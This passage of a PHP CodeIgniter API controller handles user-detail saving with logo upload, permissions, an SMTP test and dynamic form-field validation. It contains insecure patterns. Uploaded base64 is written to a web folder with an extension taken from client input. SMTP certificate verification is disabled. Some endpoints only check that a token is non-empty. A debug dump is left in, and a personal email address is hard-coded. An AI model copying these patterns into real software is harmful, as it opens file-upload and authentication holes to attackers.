					$this->db->trans_commit();
					$this->response(TRUE, $respMsg, 200);
				}
			}
		} else {
			$this->response(FALSE, 'Invalid Request', 400);
		}
	}

	// ADD Update Company Details Method Starts Here


	// ADD Update User Details Method Starts Here

	function adduserdetails()
	{
		$token = $this->input->post('token');
		if ($token == "") {
			$this->response(FALSE, 'Invalid Token.', 200);
			return;
		}
		if ($this->setData($token) == false)
			return;

		$post = (array) json_decode(file_get_contents('php://input'));
		$this->load->library('upload');
		if (isset($post['queue_id'][0])) {
			$post['queue_id'] = implode(",", $post['queue_id']);
		} else {
			$post['queue_id'] = null;
		}
		if (isset($post['action_id'][0])) {
			$post['action_id'] = implode(",", $post['action_id']);
		} else {
			$post['action_id'] = null;
		}


		if ($post['file'] != '') {
			$config['upload_path'] = 'uploads/Userlogo/';
			$config['allowed_types'] = 'gif|jpg|png';
			$config['max_size'] = 2048;
			$config['max_width'] = 1024;
			$config['max_height'] = 768;

			$fcpath = str_replace("\\", "/", FCPATH);
			$folderPath = $fcpath . 'uploads/userlogos/';
			$this->upload->initialize($config);
			$this->upload->do_upload($post['file']);
			$image_parts = explode(";base64,", $post['file']);
			$image_type_aux = explode("image/", $image_parts[0]);
			$image_base64 = base64_decode($image_parts[1]);
			// print_r($image_base64); die; 
			$file = $folderPath . uniqid() . '.' . $image_type_aux[1];
			$fileactualname = explode("/", $file);
			$post['Userlogo'] = $fileactualname[8];
			if (file_put_contents($file, $image_base64)) {
			} else {
				$this->response(FALSE, 'File Not Uploded', 400);
				return false;
			}
		} else {
			$post['Userlogo'] = $post['fileurl'];
		}


		if (!empty($post['master_name'])) {
			$masterName = $post['master_name'];
			$this->load->model('Master_Model');
			$rules = $this->Master_Model->getMasterTableRules($masterName);
			if (empty($rules)) {
				$this->response(FALSE, 'Validations not defined.', 400);
				return;
			}
			$this->form_validation->set_data($post);
			$this->form_validation->set_message('unique_module', 'Module already in use');
			$this->form_validation->set_rules($rules);
			if ($this->form_validation->run() === false) {
				$data = $this->form_validation->error_array();
				$key = array_keys($data);
				$err[] = $data[$key[0]];
				$this->response(FALSE, 'Validation Error', 400, $err);
			} else {
				$this->load->model('Master_Model');
				$this->db->trans_begin();
				$dbData = $post;

				$respMsg = '';
				$dbFields = $this->Master_Model->getMasterTableFields($masterName);
				$db_keys = array_keys($dbData);
				foreach ($db_keys as $keyName) {
					if (!in_array($keyName, $dbFields)) {
						unset($dbData[$keyName]);
					} else {
						if (array_key_exists($keyName, $dbData)) {
							$dbData[$keyName] = addslashes(trim($dbData[$keyName]));
						}
					}
				}
				$primaryKey = 'id';

				if (empty($dbData[$primaryKey])) {
					$dbData['created_by'] = $this->user_id;
					$dbData['created_date'] = date('Y-m-d H:i:s');
				} else {
					if (empty($dbData['created_by'])) {
						$dbData['created_by'] = $this->user_id;
						$dbData['created_date'] = date('Y-m-d H:i:s');
					}
					$dbData['modified_by'] = $this->user_id;
					$dbData['modified_date'] = date('Y-m-d H:i:s');
				}
				$retarr = $this->Master_Model->saveProcess($masterName, $dbData, $primaryKey);

				$userid = array('user_id' => $retarr['id']);
				$this->db->where('id', $retarr['id'])->update('tms_user_master', $userid);

				if (empty($retarr['id'])) {
					$respMsg = 'Something goes wrong.';
				} else {
					$master_title = str_replace('_', ' ', $masterName);
					$master_title = ucwords(strtolower($master_title));
					$respMsg = !empty($post[$primaryKey]) ? $master_title . ' details updated successfully' : $master_title . ' details saved successfully';
				}
				if ($this->db->trans_status() === FALSE) {
					$this->db->trans_rollback();
					$this->response(FALSE, 'Something goes wrong', 400);
				} else {
					$this->db->trans_commit();
					$this->response(TRUE, $respMsg, 200);
				}
			}
		} else {
			$this->response(FALSE, 'Invalid Request', 400);
		}
	}

	// ADD Update User Details Ends Starts Here

	function getPermissions()
	{
		$postvars = json_decode(file_get_contents("php://input"));
		$data = (array) $postvars;
		$post = $this->input->post();
		$data = array_merge($data, $post);
		if (!empty($data['token']) && !empty($data['master_name'])) {

			if ($this->setData($data['token']) == false)
				return;

			$retArr = array();
			$retArr['VIEW_RIGHT'] = 0;
			$retArr['ADD_RIGHT'] = 0;
			$retArr['EDIT_RIGHT'] = 0;
			$retArr['DELETE_RIGHT'] = 0;
			$retArr['EXPORT_RIGHT'] = 0;
			if ($this->full_control == 0) {
				$rights = $this->Api_Model->getUserTypeRights($this->user_type, $data['master_name']);
				if (!empty($rights)) {
					$retArr['VIEW_RIGHT'] = $rights[0]['view_right'];
					$retArr['ADD_RIGHT'] = $rights[0]['add_right'];
					$retArr['EDIT_RIGHT'] = $rights[0]['edit_right'];
					$retArr['DELETE_RIGHT'] = $rights[0]['delete_right'];
					$retArr['EXPORT_RIGHT'] = $rights[0]['export_right'];
				}
			} else {
				$retArr['VIEW_RIGHT'] = 1;
				$retArr['ADD_RIGHT'] = 1;
				$retArr['EDIT_RIGHT'] = 1;
				$retArr['DELETE_RIGHT'] = 1;
				$retArr['EXPORT_RIGHT'] = 1;
			}
			$this->response(TRUE, '', 200, $retArr);
		} else {
			$this->response(FALSE, 'Invalid Request', 400);
		}
	}


	public function getselectpagination()
	{

		$res = $this->db->query('select record from tms_pagination_master where status= 1')->result_array();
		$this->response(TRUE, '', 200, $res);
	}

	function getQueueChangeAllDropdown()
	{
		$postvars = json_decode(file_get_contents("php://input"));
		$data = (array) $postvars;
		$post = $this->input->post();
		$data = array_merge($data, $post);
		if (!empty($data['token'])) {
			$result = $this->Api_Model->getQueueChangeAllDropdown($data['queue_id']);
			$this->response(TRUE, '', 200, $result);
		} else {
			$this->response(FALSE, 'Invalid Request', 400);
		}
	}

	function getCategoryData()
	{
		$postvars = json_decode(file_get_contents("php://input"));
		$data = (array) $postvars;
		$post = $this->input->post();
		$data = array_merge($data, $post);
		if (!empty($data['token'])) {
			$result = $this->Api_Model->getCategoryData($data['category_id']);
			$this->response(TRUE, '', 200, $result);
		} else {
			$this->response(FALSE, 'Invalid Request', 400);
		}
	}

	public function emailTest()
	{
		$post = (array) json_decode(file_get_contents('php://input'));
		$emailaccount = $this->Api_Model->getemaildeitals($post['id']);
		if (empty($post['outgoing_user_name'])) {
			$this->response(FALSE, 'User Name  is required', 400);
		}
		$password = $post['outgoing_password'] ? $post['outgoing_password'] : $emailaccount[0]->outgoing_password;

		if (empty($password)) {
			$this->response(FALSE, 'Password is required', 400);
		}

		if (empty($post['outgoing_mail_server'])) {
			$this->response(FALSE, 'Outgoing Mail Server is required', 400);
		}

		if (empty($post['outgoing_mail_server_port'])) {
			$this->response(FALSE, 'Outgoing Mail Server Port is required', 400);
		}

		$this->load->library('Phpmail_Lib');

		$mail = $this->phpmail_lib->load();

		$mail->SMTPOptions = array(
			'ssl' => array(
				'verify_peer' => false,
				'verify_peer_name' => false,
				'allow_self_signed' => false
			)
		);

		try {
			$mail->isSMTP();                                            // Set mailer to use SMTP
			$mail->Host       = $post['outgoing_mail_server'] ? $post['outgoing_mail_server'] : '';
			$mail->SMTPAuth   = true;                                   // Enable SMTP authentication
			$mail->Timeout       =   10; // set the timeout (seconds)
			$mail->Username   = $post['outgoing_user_name'];
			$mail->Password   = $password;
			$mail->SMTPSecure = 'tls';
			$mail->Port   = $post['outgoing_mail_server_port'];
			$mail->setFrom($post['outgoing_user_name'], 'Email Testing');
			$mail->addAddress('gaurav.singh@sansoftwares.com', 'Test Mail');     // Add a recipient
			$mail->isHTML(true);                                  // Set email format to HTML
			$mail->Subject = 'Test Mail';
			$mail->Body    = 'This is a <b>Test Mail!</b>';
			if ($mail->send()) {
				$this->response(FALSE, 'Valid Configuration', 200);
			} else {
				$this->response(FALSE, 'Invalid configuration', 400);
			}
		} catch (Exception $e) {
			$this->response(FALSE, 'Message could not be sent. Mailer Error: {$mail->ErrorInfo}', 400);
		}
	}

	public function getdynamicFormMappingField()
	{
		$postvars = json_decode(file_get_contents("php://input"));
		$data = (array) $postvars;
		$post = $this->input->post();
		$data = array_merge($data, $post);
		if (!empty($data['token'])) {
			$result['dynamicFormQueue'] = $this->Api_Model->getdynamicFormMappingField($data['queueId']);
			$this->response(TRUE, '', 200, $result);
		} else {
			$this->response(FALSE, 'Invalid Request', 400);
		}
	}


	// Dynamic form builder methods starts here

	function addupdateFormFields()
	{

		$token = $this->input->post('token');
		if ($token == "") {
			$this->response(FALSE, 'Invalid Token.', 200);
			return;
		}
		if ($this->setData($token) == false)
			return;

		$post = (array) json_decode(file_get_contents('php://input'));	
		if (!empty($post['master_name'])) {
			$this->form_validation->set_data($post);
			$rules = array(
				array(
					'field' => 'field_description',
					'label' => 'Form Description',
					'rules' => 'trim|required'
				),
				array(
					'field' => 'field_name',
					'label' => 'Field Name',
					'rules' => 'trim|required'
				),
				array(
					'field' => 'data_type',
					'label' => 'Data Type',
					'rules' => 'trim|required'
				),
				array(
					'field' => 'field_length',
					'label' => 'Field Length',
					'rules' => 'trim|callback_fieldLengthRequired[' . $post['data_type'] . ']|greater_than_equal_to[1]|callback_fieldLengthVarCharMax[' . $post['data_type'] . ']|callback_fieldLengthDecimalMax[' . $post['data_type'] . ']'
				),
				array(
					'field' => 'decimal_length',
					'label' => 'Decimal Length',
					'rules' => 'trim|callback_decimalLengthRequired[' . $post['data_type'] . ']|greater_than_equal_to[1]|callback_fieldLengthDecimalDigitMax[' . $post['data_type'] . ']'
				),
				array(
					'field' => 'field_type',
					'label' => 'Field Type',
					'rules' => 'trim|callback_fieldTypeRequired[' . $post['data_type'] . ']'
				),
				array(
					'field' => 'field_values',
					'label' => 'Field Values',
					'rules' => 'trim|callback_dataRequired[' . $post['field_type'] . ']'
				),
				array(
					'field' => 'default_value',
					'label' => 'Default Values',
					'rules' => 'trim|callback_defaultDataLength[' . $post['field_length'] . ']|callback_defaultDataValue'
				),
				array(
					'field' => 'width',
					'label' => 'Width',
					'rules' => 'trim|greater_than_equal_to[25]|less_than_equal_to[1100]'
				),
			);
			$this->form_validation->set_rules($rules);
			$this->form_validation->set_message('dataRequired', 'The Field Values are required for Dropdown, MultiSelect Dropdown, Checkbox and Radio Buttons');
			$this->form_validation->set_message('fieldTypeRequired', 'The Field Type is required for the selected Data Type');
			$this->form_validation->set_message('fieldLengthRequired', 'The Field Length is required for the selected Data Type');
			$this->form_validation->set_message('decimalLengthRequired', 'The Decimal Length is required for the selected Data Type');
			$this->form_validation->set_message('defaultDataLength', 'The length default value is more than the defined length');
			$this->form_validation->set_message('defaultDataValue', 'The default value does not match with the defined values');
			// $this->form_validation->set_message('checkDataLength', 'The length of values does not match with the defined length');
			$this->form_validation->set_message('fieldLengthDecimalMax', 'The maximum possible length for decimal data type is 65 significant digits and 30 digits after the decimal point.');
			$this->form_validation->set_message('fieldLengthDecimalDigitMax', 'The maximum possible length for decimal data type is 65 significant digits and 30 digits after the decimal point.');
			if ($this->form_validation->run() == false) {
				$data = $this->form_validation->error_array();
				$firstError = array_keys($data);
				$this->response(FALSE, 'Validation Error', 400, $data[$firstError[0]]);
				return;
			} else {
				$data	= $post;
				$formDbData	= $this->Dynamicform_Model->getData($data['form_id']);
				fx::pr($formDbData,1);
				//CHECK FIELD NAME IN TABLE AND FORM FILEDS
				if (empty($data['field_id'])) {
					$fldRes	= $this->Dynamicform_Model->getTableField($data['field_name'], $formDbData->data);
					if (!empty($fldRes)) {
						$this->response(FALSE, 'The field is already exist in the Table.', 400);
						return;
					}
					$fldRes	= $this->Dynamicform_Model->getExistingTableField($data['field_name'], $formDbData->data);
					if (!empty($fldRes)) {
						$this->response(FALSE, 'The field is already exist in the Grid Tables.', 400);
						return;
					}
					$frmFld	= $this->Dynamicform_Model->checkFormFieldDedupe(array('field_name' => $data['field_name']), $data['form_id']);
					if (!empty($frmFld)) {
						$this->response(FALSE, 'The field is already exist in the Form.', 400);
						return;
					}
				}
			}
		} else {
			$this->response(FALSE, 'Invalid Master Name', 400);
		}
	}

	function fieldTypeRequired($value, $dataType)
	{
		if (!empty($dataType)) {
			if (!in_array(strtolower($dataType), array('attachment', 'text', 'datetime', 'date', 'email', 'phone', 'decimal', 'integer', 'linkurl'))) {
				if (empty($value))
					return false;
			}
		}
		return true;
	}

	function fieldLengthRequired($value, $dataType)
	{
		if (!empty($dataType)) {
			if (!in_array(strtolower($dataType), array('attachment', 'text', 'datetime', 'date', 'email', 'phone'))) {
				if (empty($value))
					return false;
			}
		}
		return true;
	}

	function decimalLengthRequired($value, $dataType)
	{
		if (!empty($dataType)) {
			if (strtolower($dataType) == 'decimal') {
				if (empty($value))
					return false;
			}
		}
		return true;
	}

	function dataRequired($value, $fieldType)
	{
		if (!empty($fieldType)) {
			if (in_array(strtolower($fieldType), array('dropdown', 'multiselect', 'checkbox', 'radio'))) {
				if (empty($value))
					return false;
			}
		}
		return true;
	}

	function defaultDataLength($value, $fieldLength)
	{
		if (!empty($fieldLength) && !empty($value)) {
			if (strlen($value) > $fieldLength) {
				return false;
			}
		}
		return true;
	}

	function defaultDataValue($value)
	{
		if (!empty($_POST['field_values']) && empty($_POST['values_from_db']) && !empty($value)) {
			$valArr	= explode(',', $_POST['field_values']);
			if (!in_array($value, $valArr)) {
				return false;
			}
		}
		return true;
	}

	// function checkDataLength($value)
	// {
	// 	if (empty($_POST['values_from_db']) && !empty($_POST['field_length']) && !empty($value)) {
	// 		$valArr	= explode(',', $value);
	// 		foreach ($valArr as $selval) {
	// 			if (strlen($value) > $_POST['field_length']) {
	// 				return false;
	// 			}
	// 		}
	// 	}
	// 	return true;
	// }

	function fieldLengthVarCharMax($value, $datType)
	{
		if (!empty($datType)) {
			if (in_array(strtolower($datType), array('integer', 'string'))) {
				if (!empty($value) && $value > 9999)
					return false;
			}
		}
		return true;
	}

	function fieldLengthDecimalMax($value, $dataType)
	{
		if (!empty($dataType)) {
			if (strtolower($dataType) == 'decimal') {
				if (!empty($value) && $value > 65)
					return false;
			}
		}
		return true;
	}

	function fieldLengthDecimalDigitMax($value, $dataType)
	{
		if (!empty($dataType)) {
			if (strtolower($dataType) == 'decimal') {
				if (!empty($value) && $value > 30)
					return false;
			}
		}
		return true;
	}

	// Dynamic form builder methods ends here

}
